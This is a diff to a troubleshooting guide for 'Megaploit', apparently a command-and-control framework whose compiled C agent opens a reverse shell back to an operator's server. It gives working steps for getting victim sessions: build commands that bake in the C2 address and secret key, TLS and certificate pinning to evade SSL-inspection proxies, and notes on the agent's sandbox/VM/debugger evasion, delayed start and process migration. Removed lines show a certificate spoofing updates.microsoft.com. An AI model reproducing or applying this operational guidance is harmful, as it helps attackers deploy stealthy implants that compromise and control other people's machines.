@@ -221,38 +221,68 @@ python3 -m megaploit --debug
 
 ## 4. No Session After Running Payload
 
-This is the most common issue. Work through these checks in order:
+This is the most common issue. Work through these checks in order.
 
 ### Step 1 — Confirm Megaploit is actually listening
 
 ```bash
-# In another terminal
-sudo ss -tlnp | grep 4444
-# Should show:  LISTEN  0  128  0.0.0.0:4444
+# Linux / macOS
+ss -tlnp | grep 4444
+# Should show:  LISTEN  0  10  0.0.0.0:4444
+
+# Windows (PowerShell)
+netstat -ano | Select-String ":4444"
 ```
 
-If nothing shows, Megaploit is not running or crashed. Restart it.
+If nothing shows, Megaploit is not running or crashed. Restart it with:
+
+```bash
+python server.py -lh <your-ip> -p 4444
+```
 
 ---
 
-### Step 2 — Confirm the target can reach your machine
+### Step 2 — Check the audit log
 
-From the **target**, try to ping or connect to your attacker IP:
+The audit log at `loot/audit.log` records every connection attempt. Look at the
+last few lines immediately after running the agent:
+
+```bash
+# Linux / macOS
+tail -20 loot/audit.log
+
+# Windows PowerShell
+Get-Content loot\audit.log -Tail 20
+```
+
+| What you see | Meaning |
+|---|---|
+| `LISTEN bind=0.0.0.0:4444` | Server started correctly |
+| `ACCEPTED ip=... session=N` | ✅ Agent connected — run `sessions` in the console |
+| `REJECTED reason=auth_failed` | **Key mismatch** — see Step 5 |
+| `REJECTED reason=tls_error` | TLS handshake failed — see Step 6 |
+| `BLOCKED reason=not_in_allowlist` | Agent IP is not in `--allow-ip` list |
+| Nothing after `LISTEN` | TCP never reached the server — see Step 3 |
+
+---
+
+### Step 3 — Confirm the target can reach your machine
+
+From the **target**, test connectivity:
 
 ```bash
 # From Linux target
-ping 192.168.1.50
 nc -zv 192.168.1.50 4444   # should say "succeeded"
 
 # From Windows target (PowerShell)
 Test-NetConnection -ComputerName 192.168.1.50 -Port 4444
 # TcpTestSucceeded: True  ← good
-# TcpTestSucceeded: False ← firewall blocking
+# TcpTestSucceeded: False ← firewall or wrong IP/port
 ```
 
 ---
 
-### Step 3 — Check your firewall
+### Step 4 — Check your firewall
 
 ```bash
 # Kali / Ubuntu — allow incoming on the listener port
@@ -265,13 +295,61 @@ sudo iptables -I INPUT -p tcp --dport 4444 -j ACCEPT
 
 ---
 
-### Step 4 — Confirm LHOST and LPORT in the payload match your server
+### Step 5 — Key mismatch (`auth_failed` in audit log)
 
-If you generated the payload with `LHOST=192.168.1.50` but later changed your IP or moved to a different network, the payload still tries to reach the old address. **Regenerate the payload** with the correct LHOST.
+The HMAC authentication uses a shared 32-byte secret. Both sides must have the
+**identical** key.
+
+**For the C agent (external build):**
+
+1. The key is embedded in the binary at build time via `SECRET_KEY=<hex>`.
+2. The server reads `secret.key` from the repo root at startup.
+3. They must contain the same hex string.
+
+**Fix:**
+
+```bash
+# From inside C-remote-shell/
+python tools/gen_key.py
+# Copy the printed hex to secret.key in the Megaploit repo root:
+echo -n "<hex>" > ../secret.key       # Linux / macOS
+Set-Content -NoNewline ..\secret.key "<hex>"  # Windows PowerShell
+
+# Rebuild the agent with the same key:
+mingw32-make C2_IP=<your-ip> C2_PORT=4444 SECRET_KEY=<hex>
+```
 
 ---
 
-### Step 5 — Check if you're behind NAT (home router / cloud VM)
+### Step 6 — TLS handshake failure (`tls_error` in audit log)
+
+The C agent always performs a SChannel TLS handshake before sending anything.
+The server must present a TLS certificate or the agent's `ClientHello` is
+misread as an HMAC response, which always fails.
+
+The server auto-generates a certificate at `loot/tls/megaploit.crt` on first
+start. If those files are corrupt or missing:
+
+```bash
+# Delete and let the server regenerate them
+rm -rf loot/tls/
+python server.py -lh <your-ip> -p 4444
+```
+
+---
+
+### Step 7 — Confirm C2_IP and C2_PORT in the binary match the server
+
+The IP and port are baked into the binary at compile time. If your server's IP
+changed since the last build, **rebuild** with the correct address:
+
+```bash
+mingw32-make C2_IP=<new-ip> C2_PORT=4444 SECRET_KEY=<hex>
+```
+
+---
+
+### Step 8 — Check if you're behind NAT (home router / cloud VM)
 
 If you are behind a NAT router:
 
@@ -281,21 +359,34 @@ If you are behind a NAT router:
 ```bash
 # Find your public IP
 curl ifconfig.me
-
-# On your router: forward TCP 4444 → 192.168.1.50:4444
 ```
 
 Or use a **VPS** as the listener (no NAT issues):
 
 ```bash
 # On VPS with public IP 203.0.113.10
-python3 -m megaploit --host 0.0.0.0 --port 4444
-# Generate payload with LHOST=203.0.113.10
+python server.py -lh 203.0.113.10 -p 4444
+# Build the agent with C2_IP=203.0.113.10
 ```
 
 ---
 
-### Step 6 — Check the payload actually ran
+### Step 9 — C agent: sandbox check silently exiting
+
+The C agent checks 10 sandbox/VM/debugger heuristics and exits silently if any
+fire. To bypass all of them during testing, build with `DBG=1`:
+
+```bash
+# from C-remote-shell/
+mingw32-make C2_IP=<your-ip> C2_PORT=4444 DBG=1
+```
+
+`DBG=1` also disables the 15–25 s startup delay and auto-migration, so the
+agent connects immediately without relocating into another process.
+
+---
+
+### Step 10 — Check the payload actually ran
 
 On the target, check for errors:
 
@@ -304,7 +395,6 @@ On the target, check for errors:
 # (Win+R → eventvwr.msc → Windows Logs → Application)
 
 # Linux
-dmesg | tail -20
 journalctl -xe | tail -40
 ```
 
@@ -637,25 +727,56 @@ megaploit > run
 
 ---
 
-## 12. SSL / HTTPS Transport Issues
+## 12. TLS / HTTPS Transport Issues
 
-### `SSL: CERTIFICATE_VERIFY_FAILED` on the target
+### The C agent never connects — `tls_error` in audit log
 
-The payload is checking the server certificate and failing. Use `--ssl-no-verify` for self-signed certs in a lab:
+The C agent performs a SChannel TLS handshake before any authentication. The
+server **must** have TLS enabled or the handshake fails immediately.
+
+Starting the server without any flags now enables TLS automatically:
 
 ```bash
-python3 -m megaploit --port 443 --ssl --ssl-no-verify
+python server.py -lh <your-ip> -p 4444
+# Prints: [+] TLS auto-cert (required for C agent) → loot/tls/megaploit.crt
+```
+
+If the cert files are corrupt, delete them and let the server regenerate:
+
+```bash
+rm -rf loot/tls/
+python server.py -lh <your-ip> -p 4444
 ```
 
 ---
 
-### Generating a self-signed certificate
+### Bringing your own certificate
 
 ```bash
-openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes \
-  -subj "/CN=updates.microsoft.com"
+python server.py -lh <your-ip> -p 4444 --cert cert.pem --key key.pem
+```
 
-python3 -m megaploit --port 443 --ssl --ssl-cert cert.pem --ssl-key key.pem
+To generate a self-signed certificate manually:
+
+```bash
+openssl req -x509 -newkey rsa:3072 -keyout key.pem -out cert.pem -days 365 -nodes \
+  -subj "/CN=<your-ip>"
+
+python server.py -lh <your-ip> -p 4444 --cert cert.pem --key key.pem
+```
+
+---
+
+### Optional: pin the server certificate in the C agent
+
+To reject SSL-inspection proxies, embed the cert's SHA-256 fingerprint at build
+time:
+
+```bash
+openssl x509 -in loot/tls/megaploit.crt -noout -fingerprint -sha256
+# prints: SHA256 Fingerprint=AA:BB:CC:... — strip colons to get 64 hex chars
+
+mingw32-make C2_IP=<ip> SECRET_KEY=<hex> C2_CERT_PIN=<64-hex-fingerprint>
 ```
 
 ---
